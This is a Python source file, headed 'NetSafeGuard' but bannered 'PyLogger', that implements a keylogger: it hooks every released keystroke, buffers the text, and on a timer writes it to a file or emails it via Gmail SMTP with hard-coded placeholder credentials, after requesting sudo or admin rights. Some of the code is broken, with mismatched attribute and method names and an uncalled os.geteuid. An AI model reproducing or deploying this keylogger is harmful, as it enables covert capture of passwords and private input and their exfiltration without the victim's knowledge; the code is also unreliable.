#!/usr/bin/python

# Coding: UTF-8
# Name: NetSafeGuard
# Author: AlexEmployed
# Version: 1.0.0
# License: GPL-3.0 version
# Copyright: alexemployed 2023
# Github: https://github.com/alexemployed
# Language: Python

# Imports
import keyboard
import smtplib
import subprocess
import os, sys
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Version
_version = "0.0.1"

# Colors
_black = "\033[0;30m"
_red = "\033[0;31m"
_green = "\033[0;32m"
_brown = "\033[0;33m"
_blue = "\033[0;34m"
_yellow = "\033[1;33m"
_purple = "\033[0;35m"
_cyan = "\033[0;36m"
_white="\033[0;37m"
_lightGray = "\033[0;37m"
_darkGray = "\033[1;30m"
_lightRed = "\033[1;31m"
_lightGreen = "\033[1;32m"
_lightBlue = "\033[1;34m"
_lightPurple = "\033[1;35m"
_lightCyan = "\033[1;36m"
_lightWhite = "\033[1;37m"

# Logo
def startup():
    print(f"""
    ██████╗ ██╗   ██╗██╗      ██████╗  ██████╗  ██████╗ ███████╗██████╗ 
    ██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔════╝ ██╔════╝ ██╔════╝██╔══██╗
    ██████╔╝ ╚████╔╝ ██║     ██║   ██║██║  ███╗██║  ███╗█████╗  ██████╔╝
    ██╔═══╝   ╚██╔╝  ██║     ██║   ██║██║   ██║██║   ██║██╔══╝  ██╔══██╗
    ██║        ██║   ███████╗╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║
    ╚═╝        ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
   {_cyan}[+]CREATOR: {_white}https://github.com/alexemployed          {_cyan}Version:{_white} {_version}
""")
    
# Privalages
def check_root():
    ret = 0
    if os.geteuid != 0:
        msg = "[sudo] password for %u: "
        ret = subprocess.check_call("sudo -v -p '%s'" %msg, shell=True)
    return ret

def check_admin():
    try:
        subprocess.check_call(["net", "session"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except subprocess.CalledProcessError:
        return False

# Global Variables
send_report = 60
email_address = 'email@provider.ltd'
email_password = 'password123'

# Main Programm
class KeyLogger:

    def __init__(self, interval, report_method='email'):
        self.interval = interval
        self.report_method = report_method
        self.log = ''
        self.start_datetime = datetime.now()
        self.end_datetime = datetime.now()


    def callback(self, event):
        name = event.name

        if len(name) > 1:
            if name == 'space':
                name = " "
            elif name == 'enter':
                name = '[ENTER]\n'
            elif name == 'decimal':
                name = '.'
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
    
        self.log += name

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
    
    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)

        print(f"{_green}[+]{_white} Saved {self.filename}.txt")
    
    def prepare_email(self, message):
        msg = MIMEMultipart("alternative")
        msg['From'] = email_address
        msg['To'] = email_address
        msg['Subject'] = "PyLogger Log"

        html = f'<p>{message}</p>'
        text_part = MIMEText(message, 'plain')
        html_part = MIMEText(html, 'html')
        msg.attach(text_part)
        msg.attach(html_part)

        return msg.as_string()
    
    def send_email(self, email, password, message, verbose=1):
        
        email_server = smtplib.SMTP('smtp.gmail.com', 587)
        email_server.starttls()

        email_server.login(email, password)
        email_server.sendmail(email, email, self.prepare_email(message))

        email_server.quit()

        if verbose:
            print(f"{datetime.now()} - {_green}[+]{_white}Sent an email to {email} containing:  {message}")

    def report(self):
        
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(email_address, email_password, self.log)
            elif self.report_method == "file":
                self.report_to_file()
                print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):

        self.start_datetime = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{_green}[+]{_white}Started PyLogger!")
        keyboard.wait()

if __name__ == '__main__':
    startup()
    if os.name == 'posix':
        check_root()
        keylogger = KeyLogger(interval = send_report, report_method = 'file')
        keylogger.start()
    elif os.name == 'nt':
        check_admin()
        keylogger = KeyLogger(interval = send_report, report_method = 'file')
        keylogger.start()
    else: 
        sys.exit(1)